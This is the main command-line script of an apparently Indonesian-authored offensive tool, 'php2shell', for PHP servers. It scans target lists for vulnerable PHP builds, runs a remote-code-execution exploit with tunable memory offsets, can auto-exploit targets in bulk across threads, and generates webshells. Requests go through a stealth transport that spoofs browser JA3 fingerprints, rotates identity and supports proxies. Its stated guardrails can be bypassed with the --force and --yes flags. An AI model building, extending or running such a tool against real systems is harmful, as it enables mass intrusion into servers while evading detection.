#!/usr/bin/env python3
"""php2shell.py — SATU CLI: scan | detect | preflight | exploit | shell | builds | version.

Versi ini: full bilingual (ID/EN) lewat lib/i18n.py. Ganti bahasa dengan
  --lang id | --lang en   atau env P2S_LANG   atau otomatis dari locale sistem.

Pagar yang TIDAK bisa dimatikan (ditegakkan di KODE, bukan teks):
  - exploit hanya jalan bila READY (tanpa blocker keras) DAN --yes/konfirmasi
  - perintah default `id` (proof-of-access), maks 14 byte, tanpa chaining
  - primitif reverse-shell (bash/nc/python/...) diblokir permanen di runner
  - semua request lewat transport stealth yang sama (JA3 konsisten)
"""

from __future__ import annotations

import argparse
import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

from lib import banner as banner_mod                     # noqa: E402
from lib import config                                   # noqa: E402
from lib import advisory as advisory_mod                 # noqa: E402
from lib import reporter                                 # noqa: E402
from lib import updater                                  # noqa: E402
from lib import webshell                                 # noqa: E402
from lib import scanner                                  # noqa: E402
from lib.banner import C, _use_color                     # noqa: E402
from lib.i18n import I18n, detect_lang, available_langs, init as i18n_init  # noqa: E402
from lib.transport import (                              # noqa: E402
    DEFAULT_DELAY, DEFAULT_TIMEOUT, HAVE_CURL_CFFI, PROFILES,
    Transport, load_targets,
)

VERSION = config.VERSION
SHOWN = False

# Instance i18n global — diisi di main() setelah --lang dibaca.
_T: I18n = I18n("en")


def t(key: str, **kw) -> str:
    return _T.get(key, **kw)


# --------------------------------------------------------------------------- #
# Banner                                                                       #
# --------------------------------------------------------------------------- #

def _banner(mode: str = "", profile: str = "", delay: float = 0.0,
            force: bool = False) -> None:
    global SHOWN
    if SHOWN and not force:
        return
    SHOWN = True
    print(banner_mod.render(
        mode=mode, profile=profile or "", delay=delay or 0.0,
        stealth=HAVE_CURL_CFFI, version=VERSION, lang=_T.lang,
    ))


def _require_scheme(url: str) -> str:
    """Tolak URL tanpa skema SEBELUM menyentuh jaringan (exit 2)."""
    if not url.lower().startswith(("http://", "https://")):
        raise SystemExit(f"php2shell: {t('errors.url_scheme', url=url)}")
    return url


# --------------------------------------------------------------------------- #
# Mode: detect / preflight                                                     #
# --------------------------------------------------------------------------- #

def _cmd_detect(args) -> int:
    from lib import detect as detect_mod
    from lib import preflight as preflight_mod

    urls = args.urls or []
    if args.list:
        urls += load_targets(args.list)
    if not urls:
        print(f"php2shell: {t('errors.list_not_found', path=args.list or '')}")
        return 2

    tr = _make_transport(args)
    records = []
    for url in urls:
        _require_scheme(url)
        d = detect_mod.detect(
            url, tr,
            check_upload_progress=not args.no_upload_progress,
            check_display_errors=not args.no_display_errors,
            check_oom=(False if getattr(args, "no_oom", False) else None),
            sapi=getattr(args, "sapi", "auto") or "auto",
        )
        p = preflight_mod.preflight(d)
        records.append({"url": url, "detect": d.as_dict(), "preflight": p.as_dict()})
        _print_detect_line(url, d, p)

    _maybe_write_reports(args, records)
    return 0


def _print_detect_line(url: str, d, p) -> None:
    c = C(_use_color())
    vcol = {"vulnerable": c.red, "patched": c.green, "eol": c.yellow}.get(
        d.verdict, c.grey)
    print(f"  {c.bold(url)}")
    print(f"    {t('detect.php_version'):<16}: {d.php_version or '?'}  "
          f"[{vcol(d.verdict)}]")
    print(f"    {t('detect.server'):<16}: {d.server or '?'}")
    print(f"    {t('detect.upload_progress'):<16}: {d.upload_progress}")
    print(f"    {t('detect.display_errors'):<16}: {d.display_errors}")
    if d.oom_signal:
        print(f"    {t('detect.oom_verdict'):<16}: {d.oom_signal}  {d.oom_detail}")
    print(f"    {t('preflight.score'):<16}: {p.score}/90  "
          f"{t('verdict.ready') if p.ready else t('verdict.not_ready')}"
          f"  [{t('preflight.support_level')}: {p.support}]")
    if p.blockers:
        for b in p.blockers:
            print(f"    {c.red(t('preflight.blockers'))}: {t(b)}")


# --------------------------------------------------------------------------- #
# Mode: exploit                                                                #
# --------------------------------------------------------------------------- #

def _cmd_exploit(args) -> int:
    from lib import detect as detect_mod
    from lib import preflight as preflight_mod
    from lib import runner

    url = _require_scheme(args.url)
    tr = _make_transport(args)

    # Preflight dulu (ringan) sebelum konfirmasi.
    d = detect_mod.detect(url, tr, check_oom=(False if args.no_oom else None))
    p = preflight_mod.preflight(d)
    _print_detect_line(url, d, p)

    if not p.ready and not args.force:
        print(f"  {C(_use_color()).red(t('exploit.not_ready_abort'))}")
        return 3

    # Konfirmasi untuk target aktif (non-loopback).
    if not args.yes and not _is_loopback(url):
        ans = input(f"  {t('exploit.confirm_prompt')}").strip().lower()
        if ans not in ("y", "yes"):
            print(f"  {t('exploit.blind_note')}")
            return 4

    out = runner.run(
        url, tr,
        cmd=args.cmd, proof_file=args.proof_file,
        profile=args.exploit_profile,
        force=args.force, assume_yes=args.yes,
        huge_mb=args.huge_mb, retries=args.retries, timeout=args.exploit_timeout,
        zif_offset=args.zif_offset, dtor_offset=args.dtor_offset,
        htdata_offset=args.htdata_offset,
        no_pre_rotate=args.no_pre_rotate, no_retry_rotate=args.no_retry_rotate,
        no_oom=args.no_oom,
    )
    for line in out.log:
        print(f"    {C(_use_color()).grey(line)}")

    c = C(_use_color())
    if out.success:
        tag = c.green(t("exploit.proof")) if not out.blind else c.yellow(t("exploit.blind"))
        print(f"  {tag} ({out.result.elapsed:.1f}s): "
              f"{out.proof or t('exploit.blind_note')}")
        return 0
    print(f"  {c.red(t('exploit.failed'))}: {out.error}")
    return 1


def _is_loopback(url: str) -> bool:
    return any(h in url for h in ("127.0.0.1", "localhost", "0.0.0.0", "[::1]"))


# --------------------------------------------------------------------------- #
# Mode: scan                                                                   #
# --------------------------------------------------------------------------- #

def _cmd_scan(args) -> int:
    if not args.list:
        print(f"php2shell: {t('errors.list_not_found', path='-')}")
        return 2
    tr_factory = lambda: _make_transport(args)  # noqa: E731

    def progress(done, total, url):
        print(f"  [{t('scanner.scanning')}] {done}/{total}  {url}")

    records = scanner.scan(
        args.list, tr_factory, threads=args.threads,
        do_exploit=args.exploit,
        exploit_kwargs={"cmd": args.cmd, "assume_yes": args.yes,
                        "profile": args.exploit_profile} if args.exploit else None,
        progress=progress,
    )
    dicts = [r.as_dict() for r in records]
    print()
    print(reporter.table(dicts))
    print(reporter.summary(dicts))
    _maybe_write_reports(args, dicts)
    return 0


# --------------------------------------------------------------------------- #
# Mode: shell                                                                  #
# --------------------------------------------------------------------------- #

def _cmd_shell(args) -> int:
    c = C(_use_color())
    cmds = tuple(s.strip() for s in (args.commands or "id,whoami").split(",") if s.strip())
    try:
        g = webshell.generate(
            args.out, ttl_hours=args.ttl, commands=cmds,
            author=args.author or "php2shell",
            purpose=args.purpose or "authorized security assessment",
        )
    except ValueError as exc:
        print(f"  {c.red(str(exc))}")
        return 2
    print(f"  {c.green(t('shell_gen.written'))}: {g.path}")
    print(f"  {t('shell_gen.credentials')}: {g.cred_path}")
    print(f"  {t('shell_gen.ttl')}: {args.ttl}h   "
          f"{t('shell_gen.commands_whitelist')}: {', '.join(g.commands)}")
    print(f"  {c.grey(t('shell_gen.bcrypt_note'))}")
    print(f"  {c.grey(t('shell_gen.local_test_hint'))}")
    print(f"  {c.yellow(t('shell_gen.upload_notice'))}")
    return 0


# --------------------------------------------------------------------------- #
# Mode: builds / advisories / version                                          #
# --------------------------------------------------------------------------- #

def _cmd_builds(args) -> int:
    c = C(_use_color())
    print(f"  {c.bold(t('builds.table_head'))}")
    head = f"{'PHP':<9} {t('builds.arch'):<9} {t('builds.support'):<8} {t('builds.note')}"
    print(f"  {c.grey(head)}")
    counts = {"rce": 0, "leak": 0, "no": 0}
    lvl_key = {"rce": "builds.level_rce", "leak": "builds.level_leak", "no": "builds.level_no"}
    for e in config.BUILD_SUPPORT:
        if args.level and args.level != e.level:
            continue
        counts[e.level] = counts.get(e.level, 0) + 1
        col = {"rce": c.red, "leak": c.yellow, "no": c.grey}[e.level]
        print(f"  {e.php:<9} {e.arch:<9} {col(t(lvl_key[e.level])):<8} {c.grey(e.note)}")
    print()
    print("  " + t("builds.total_line", n=len(config.BUILD_SUPPORT),
                   rce=counts["rce"], leak=counts["leak"], no=counts["no"]))
    return 0


def _cmd_advisories(args) -> int:
    c = C(_use_color())
    print(f"  {c.bold(t('advisory.title'))}")
    for a in advisory_mod.ADVISORIES:
        print(f"  {c.cyan(a['cve'])}")
        print(f"    {t('advisory.class'):<10}: {a['class']}")
        print(f"    {t('advisory.trigger'):<10}: {a['trigger'][:70]}...")
        print(f"    {t('advisory.status'):<10}: "
              f"{t('advisory.implemented') if a['status']=='implemented' else t('advisory.detect_only')}")
    print()
    for n in advisory_mod.NOTES:
        print(f"  {c.yellow('!')} {t(n)}")
    return 0


def _cmd_version(args) -> int:
    c = C(_use_color())
    tr = _make_transport(args)
    res = updater.check(VERSION, tr, use_cache=not args.no_cache)
    print(f"  {t('updater.local'):<8}: {res['local']}")
    print(f"  {t('updater.remote'):<8}: {res['remote'] or '?'}  "
          f"({t('updater.source')}: {res['source'] or '?'})")
    print(f"  {t('updater.status'):<8}: {res['status']}")
    print(f"  {t('updater.message'):<8}: {t(res['message']) if res['message'] else res.get('error','')}")
    print(f"  {t('updater.repo'):<8}: {res['repo']}")
    print(f"  {c.grey(t('updater.cache_note'))}")
    return 10 if res["status"] == "update" else 0


# --------------------------------------------------------------------------- #
# Helper                                                                       #
# --------------------------------------------------------------------------- #

def _make_transport(args) -> Transport:
    return Transport(
        profile=getattr(args, "ja3", "chrome") or "chrome",
        delay=getattr(args, "delay", DEFAULT_DELAY),
        timeout=getattr(args, "timeout", DEFAULT_TIMEOUT),
        proxy=getattr(args, "proxy", None),
        audit_log=getattr(args, "audit", None),
        verbose=getattr(args, "verbose", False),
        rotate_identity=getattr(args, "rotate_identity", False),
    )


def _maybe_write_reports(args, records: list[dict]) -> None:
    if getattr(args, "json", None):
        p = reporter.write_json(args.json, records, meta={"version": VERSION, "lang": _T.lang})
        print(f"  {t('report.json_written')}: {p}")
    if getattr(args, "csv", None):
        p = reporter.write_csv(args.csv, records)
        print(f"  {t('report.csv_written')}: {p}")


# --------------------------------------------------------------------------- #
# Parser                                                                       #
# --------------------------------------------------------------------------- #

def build_parser() -> argparse.ArgumentParser:
    c = C(_use_color())
    ap = argparse.ArgumentParser(
        prog="php2shell",
        description=f"{t('app.tagline')}   [{', '.join(available_langs())}]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=banner_mod.guards_text(),
    )
    ap.add_argument("--lang", choices=available_langs(), default=None,
                    help=t("app.language_switch_hint"))

    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--ja3", choices=list(PROFILES), default="chrome")
    common.add_argument("--delay", type=float, default=DEFAULT_DELAY)
    common.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    common.add_argument("--proxy", default=None)
    common.add_argument("--audit", default=None)
    common.add_argument("--rotate-identity", action="store_true")
    common.add_argument("-v", "--verbose", action="store_true")
    common.add_argument("--json", default=None)
    common.add_argument("--csv", default=None)

    rep = argparse.ArgumentParser(add_help=False)
    rep.add_argument("-u", "--urls", nargs="+", default=[])
    rep.add_argument("-l", "--list", default=None)
    rep.add_argument("--no-upload-progress", action="store_true")
    rep.add_argument("--no-display-errors", action="store_true")
    rep.add_argument("--no-oom", action="store_true")
    rep.add_argument("--sapi", default="auto", choices=["auto", "mod_php", "fpm"])

    exp_core = argparse.ArgumentParser(add_help=False)
    exp_core.add_argument("-c", "--cmd", default="id")
    exp_core.add_argument("--allow-cmd", action="append", default=[])
    exp_core.add_argument("--proof-file", default=None)
    exp_core.add_argument("--exploit-profile", default=config.DEFAULT_EXPLOIT_PROFILE,
                          choices=list(config.EXPLOIT_PROFILES))
    exp_core.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None)
    exp_core.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None)
    exp_core.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None)
    exp_core.add_argument("--huge-mb", type=int, default=None)
    exp_core.add_argument("--retries", type=int, default=3)
    exp_core.add_argument("--exploit-timeout", type=int, default=300)
    exp_core.add_argument("--force", action="store_true")
    exp_core.add_argument("--yes", action="store_true")
    exp_core.add_argument("--no-pre-rotate", action="store_true")
    exp_core.add_argument("--no-retry-rotate", action="store_true")

    # Untuk mode `exploit` (satu URL wajib).
    exp = argparse.ArgumentParser(add_help=False, parents=[exp_core])
    exp.add_argument("-u", "--url", required=True)

    sub = ap.add_subparsers(dest="mode", metavar="MODE")

    p_scan = sub.add_parser("scan", parents=[common, rep, exp_core],
                            help=t("modes.scan"), add_help=True)
    p_scan.add_argument("--exploit", action="store_true")
    p_scan.add_argument("--threads", type=int, default=5)
    p_scan.set_defaults(func=_cmd_scan)

    p_det = sub.add_parser("detect", parents=[common, rep],
                           help=t("modes.detect"), add_help=True)
    p_det.set_defaults(func=_cmd_detect)

    p_pre = sub.add_parser("preflight", parents=[common, rep],
                           help=t("modes.preflight"), add_help=True)
    p_pre.set_defaults(func=_cmd_detect)

    p_exp = sub.add_parser("exploit", parents=[common, exp],
                           help=t("modes.exploit"), add_help=True)
    p_exp.set_defaults(func=_cmd_exploit)

    p_shell = sub.add_parser("shell", parents=[common],
                             help=t("modes.shell"), add_help=True)
    p_shell.add_argument("--out", default="shell/")
    p_shell.add_argument("--ttl", type=int, default=72)
    p_shell.add_argument("--commands", default="id,whoami")
    p_shell.add_argument("--author", default=None)
    p_shell.add_argument("--purpose", default=None)
    p_shell.set_defaults(func=_cmd_shell)

    p_b = sub.add_parser("builds", parents=[common],
                         help=t("modes.builds"), add_help=True)
    p_b.add_argument("--level", choices=["rce", "leak", "no"], default=None)
    p_b.set_defaults(func=_cmd_builds)

    p_a = sub.add_parser("advisories", parents=[common],
                         help=t("modes.advisories"), add_help=True)
    p_a.set_defaults(func=_cmd_advisories)

    p_v = sub.add_parser("version", parents=[common],
                         help=t("modes.version"), add_help=True)
    p_v.add_argument("--no-cache", action="store_true")
    p_v.set_defaults(func=_cmd_version)

    return ap


# --------------------------------------------------------------------------- #
# main                                                                         #
# --------------------------------------------------------------------------- #

def main(argv: list[str] | None = None) -> int:
    global _T
    argv = list(sys.argv[1:] if argv is None else argv)

    # MODE INTERAKTIF: tanpa argumen -> menu input (bahasa + mode + parameter).
    if not argv:
        from lib import interactive
        return interactive.run()

    # Pra-parse --lang supaya banner & pesan sudah dalam bahasa yang tepat.
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("--lang", default=None)
    pre_args, _ = pre.parse_known_args(argv)
    _lang = detect_lang(pre_args.lang)
    _T = I18n(_lang)
    # Sinkronkan instance global i18n (dipakai banner/reporter via lib.i18n.t).
    i18n_init(_lang)

    ap = build_parser()

    args = ap.parse_args(argv)
    if not getattr(args, "mode", None):
        # Ada argumen tapi tanpa mode -> masuk interaktif ( hormati --lang bila ada ).
        from lib import interactive
        return interactive.run(seed_lang=pre_args.lang)

    _banner(mode=args.mode, profile=getattr(args, "ja3", ""),
            delay=getattr(args, "delay", 0.0))
    try:
        return args.func(args)
    except KeyboardInterrupt:
        print()
        return 130
    except SystemExit:
        raise
    except Exception as exc:  # fail-aman: jangan pernah traceback mentah ke user.
        print(f"php2shell: {t('errors.unexpected')}: {exc}",
              file=sys.stderr)
        if getattr(args, "verbose", False):
            raise
        return 1


if __name__ == "__main__":
    sys.exit(main())
